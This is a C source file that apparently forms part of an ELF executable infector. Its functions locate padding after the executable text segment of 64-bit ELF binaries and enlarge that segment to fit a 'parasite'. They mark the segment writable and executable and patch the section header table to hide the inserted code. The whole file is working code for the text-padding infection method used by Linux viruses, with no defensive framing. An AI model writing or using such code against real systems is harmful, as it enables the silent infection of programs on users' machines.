#include "vil.h"

off_t		PaddingFinder_shdr_64(void *ptr)
{   
	Elf64_Ehdr	*ehdr		= (Elf64_Ehdr *) ptr;
	u_int16_t	shnum 		= ehdr->e_shnum;
	Elf64_Shdr *shdr = (Elf64_Shdr *)(ptr + ehdr->e_shoff);

	off_t previous = 0;
	off_t current = 0;
	int i;
	for (i = 1 ; i < shnum ; ++i)
	{
		previous = shdr[i - 1].sh_offset + shdr[i - 1].sh_size;
		current = shdr[i].sh_offset;
		if (!previous|| previous > current)
			continue;
		if ((current - previous) > strlen(message))
			return (previous);
	}
	return (0);
}

off_t		PaddingSizeFinder_64_v2(void *ptr)
{   
	Elf64_Ehdr	*ehdr		= (Elf64_Ehdr *) ptr;
	u_int16_t	phnum 		= ehdr->e_phnum;
	Elf64_Phdr *phdr		= (Elf64_Phdr *)(ptr + ehdr->e_phoff);

	// Parse PHT entries
	u_int16_t TEXT_SEGMENT_FOUND = 0;
	int i;
	for (i = 0 ; i < phnum ; ++i)
	{
		// printf("phdr[%d]", i);
		// Find the .text Segment (containing .text section)
		if (TEXT_SEGMENT_FOUND  == 0 &&
			phdr[i].p_type  == PT_LOAD &&
			phdr[i].p_flags == (PF_R | PF_X))
		{
			TEXT_SEGMENT_FOUND = 1;
			// Calculate the offset where the .text segment ends to bellow calculate padding_size 
			parasite_offset	= phdr[i].p_offset + phdr[i].p_filesz;

			// Increase its p_filesz and p_memsz by parasite_full_size (to accomodate parasite)
			phdr[i].p_filesz = phdr[i].p_filesz + parasite_full_size;
			phdr[i].p_memsz  = phdr[i].p_memsz  + parasite_full_size;

			// Make text segment writable
			phdr[i].p_flags = PF_R | PF_W | PF_X;
		}
		// Find next segment after .text Segment and calculate padding size
		else if (TEXT_SEGMENT_FOUND)
		{
			textafter = phdr[i].p_offset;
			// Return padding_size
			return (textafter - parasite_offset);
		}
	}

	return 0;
}

// Patch SHT (i.e. find the last section of .text segment and increase its size by parasite_size)
void		SHT_Patcher_64(void *ptr)
{
	Elf64_Ehdr	*ehdr 			= (Elf64_Ehdr *) ptr;	
	Elf64_Off	sht_offset 		= ehdr->e_shoff;
	u_int16_t	shnum			= ehdr->e_shnum;
    Elf64_Off	current_section_end_offset;

    // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
    Elf64_Shdr *shdr = (Elf64_Shdr *) (ptr + sht_offset);

    int i;
    for (i = 0 ; i < shnum ; ++i)
    {
		current_section_end_offset = shdr[i].sh_offset + shdr[i].sh_size;
        if (parasite_offset == current_section_end_offset)
        {
            // This is the last section of .text Segment
			// Increase the sizeof this section by a parasite_full_size to accomodate parasite
            shdr[i].sh_size = shdr[i].sh_size + parasite_full_size;
			return ;
		}
    }
}
